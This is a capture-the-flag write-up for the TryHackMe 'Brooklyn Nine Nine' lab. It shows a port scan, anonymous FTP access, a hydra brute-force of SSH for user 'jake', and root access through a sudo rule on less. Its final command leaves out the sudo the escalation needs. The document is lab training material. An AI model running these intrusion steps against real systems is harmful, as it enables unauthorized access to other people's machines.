# [THM] - Brooklyn Nine Nine

[Room link](https://tryhackme.com/room/brooklynninenine)

---

## Enumeration

I use nmap for scanning the machine ports and services avalaibles.

```bash
$ nmap -sS <target_ip>
[...]
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Let's see on the ftp service with anonymous user.

```bash
$ ftp <target_ip>
Name (10.10.193.105:<user>): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||60903|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17  2020 .
drwxr-xr-x    2 0        114          4096 May 17  2020 ..
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
```

Get the file called "note_to_jake.txt" and read it.

```txt
$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

So Jake have a weak password.

---

## Exploitation

We can try to bruteforce ssh with the user "jake" with a simple and famous wordlist called rockyou.

```bash
$ hydra -I -f -Vv -l jake -P <wordlist_rockyou> <target_ip> ssh
[...]
[22][ssh] host: 10.10.193.105   login: jake   password: *************
[STATUS] attack finished for 10.10.193.105 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

---

## User flag

Let's connect on the target machine through ssh

```bash
ssh jake@10.10.193.105        
[...]
jake@10.10.193.105's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ 
```

Get the user flag on /home/holt/user.txt

---

---

## Root flag

We can check the sudo permissions 

```bash
$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Check on this website at the less section -> https://gtfobins.github.io/gtfobins/less/#sudo

For read the root.txt, use the following command.

```bash
$ less /root/root.txt
```
